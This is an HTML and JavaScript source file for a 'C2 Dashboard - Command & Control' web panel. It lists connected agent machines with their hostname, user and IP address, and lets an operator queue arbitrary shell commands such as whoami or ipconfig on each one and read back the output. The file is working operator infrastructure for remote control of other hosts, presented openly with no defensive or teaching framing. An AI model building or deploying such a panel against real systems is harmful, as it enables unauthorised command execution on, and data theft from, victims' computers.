<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard - Command & Control</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
        }
        
        .header {
            background: #001a0f;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff41;
            box-shadow: 0 0 10px rgba(0,255,65,0.3);
        }
        
        .header h1 {
            font-size: 28px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #001a0f;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #00ff41;
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
        }
        
        .agents-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .agent-card {
            background: #001a0f;
            border-radius: 10px;
            padding: 20px;
            border: 1px solid #00ff41;
            transition: all 0.3s ease;
        }
        
        .agent-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0,255,65,0.2);
        }
        
        .agent-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff41;
        }
        
        .agent-name {
            font-size: 18px;
            font-weight: bold;
        }
        
        .status {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        
        .status.online {
            background: #00ff41;
            color: #000;
        }
        
        .status.offline {
            background: #ff0000;
            color: #fff;
        }
        
        .agent-info {
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .command-form {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .command-input {
            flex: 1;
            background: #000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            font-family: monospace;
            border-radius: 5px;
        }
        
        .command-input:focus {
            outline: none;
            box-shadow: 0 0 5px #00ff41;
        }
        
        .send-btn {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .send-btn:hover {
            background: #00cc34;
            transform: scale(1.05);
        }
        
        .task-history {
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .task-item {
            padding: 5px;
            margin: 5px 0;
            background: #000;
            border-left: 3px solid #00ff41;
        }
        
        .task-command {
            color: #ffff00;
        }
        
        .task-result {
            color: #fff;
            margin-top: 5px;
            word-break: break-all;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #00ff41;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .blink {
            animation: blink 1s infinite;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 C2 DASHBOARD - COMMAND & CONTROL</h1>
        <div id="timestamp"></div>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div>ONLINE AGENTS</div>
            <div class="stat-number" id="onlineCount">0</div>
        </div>
        <div class="stat-card">
            <div>AGENTS TOTAL</div>
            <div class="stat-number" id="totalCount">0</div>
        </div>
        <div class="stat-card">
            <div>COMMANDS SENT</div>
            <div class="stat-number" id="commandsSent">0</div>
        </div>
    </div>
    
    <div id="agentsContainer" class="agents-grid">
        <div class="loading">🔄 LOADING AGENTS...</div>
    </div>
    
    <script>
        let commandsCount = 0;
        
        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').innerHTML = 
                `🕐 ${now.toLocaleString('pt-BR')} - Operational System`;
        }
        
        async function loadAgents() {
            try {
                const response = await fetch('/api/agents');
                const agents = await response.json();
                
                const online = agents.filter(a => {
                    const lastSeen = new Date(a.last_seen);
                    const now = new Date();
                    return (now - lastSeen) < 60000;
                });
                
                document.getElementById('onlineCount').innerHTML = online.length;
                document.getElementById('totalCount').innerHTML = agents.length;
                
                const container = document.getElementById('agentsContainer');
                
                if (agents.length === 0) {
                    container.innerHTML = '<div class="loading">⚠️ No agents connected. Awaiting...<br><span class="blink">🟢</span></div>';
                    return;
                }
                
                container.innerHTML = agents.map(agent => {
                    const isOnline = (new Date() - new Date(agent.last_seen)) < 60000;
                    const lastSeenDate = new Date(agent.last_seen).toLocaleString();
                    
                    return `
                        <div class="agent-card" data-agent-id="${agent.id}">
                            <div class="agent-header">
                                <span class="agent-name">💻 ${agent.hostname}</span>
                                <span class="status ${isOnline ? 'online' : 'offline'}">
                                    ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}
                                </span>
                            </div>
                            <div class="agent-info">
                                <div>🆔 ID: ${agent.id.substring(0, 8)}...</div>
                                <div>👤 User: ${agent.username || 'Unknown'}</div>
                                <div>🌐 IP: ${agent.ip}</div>
                                <div>🕐 Last Seen: ${lastSeenDate}</div>
                            </div>
                            <div class="command-form">
                                <input type="text" class="command-input" placeholder="Command (e.g., whoami, dir, ipconfig)" 
                                       id="cmd-${agent.id}">
                                <button class="send-btn" onclick="sendCommand('${agent.id}')">🚀 EXECUTAR</button>
                            </div>
                            <div class="task-history" id="history-${agent.id}">
                                <div style="color: #888;">Loading history...</div>
                            </div>
                        </div>
                    `;
                }).join('');
                
                // Loads each agent’s history
                for (const agent of agents) {
                    loadAgentHistory(agent.id);
                }
                
            } catch (error) {
                console.error('Error loading agents:', error);
                document.getElementById('agentsContainer').innerHTML = 
                    '<div class="loading">❌ Error connecting to C2 server</div>';
            }
        }
        
        async function loadAgentHistory(agentId) {
            try {
                const response = await fetch(`/api/agent_tasks/${agentId}`);
                const tasks = await response.json();
                
                const historyDiv = document.getElementById(`history-${agentId}`);
                if (!historyDiv) return;
                
                if (tasks.length === 0) {
                    historyDiv.innerHTML = '<div style="color: #888;">📭 No commands executed yet</div>';
                    return;
                }
                
                historyDiv.innerHTML = tasks.slice(0, 5).map(task => `
                    <div class="task-item">
                        <div class="task-command">📌 ${task.command}</div>
                        <div class="task-result">📄 ${task.result ? task.result.substring(0, 100) : '⏳ Pending...'}</div>
                        <div style="color: #888; font-size: 10px;">${new Date(task.created_at).toLocaleString()}</div>
                    </div>
                `).join('');
                
            } catch (error) {
                console.error('Error loading history:', error);
            }
        }
        
        async function sendCommand(agentId) {
            const input = document.getElementById(`cmd-${agentId}`);
            const command = input.value.trim();
            
            if (!command) {
                alert('Please enter a command!');
                return;
            }
            
            try {
                const response = await fetch('/api/send_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        agent_id: agentId,
                        command: command
                    })
                });
                
                const result = await response.json();
                
                if (result.status === 'queued') {
                    commandsCount++;
                    document.getElementById('commandsSent').innerHTML = commandsCount;
                    input.value = '';
                    
                    // Reload history after 2 seconds
                    setTimeout(() => loadAgentHistory(agentId), 2000);
                    
                    // Visual feedback
                    const btn = document.querySelector(`[data-agent-id="${agentId}"] .send-btn`);
                    const originalText = btn.innerHTML;
                    btn.innerHTML = '✅ SENT!';
                    setTimeout(() => btn.innerHTML = originalText, 2000);
                } else {
                    alert('Error sending command: ' + (result.message || 'Unknown'));
                }
                
            } catch (error) {
                alert('Communication error with the server: ' + error.message);
            }
        }
        
        // Updates every 5 seconds.
        setInterval(() => {
            loadAgents();
            updateTimestamp();
        }, 5000);
        
        // Loads initial data
        updateTimestamp();
        loadAgents();
    </script>
</body>
</html>
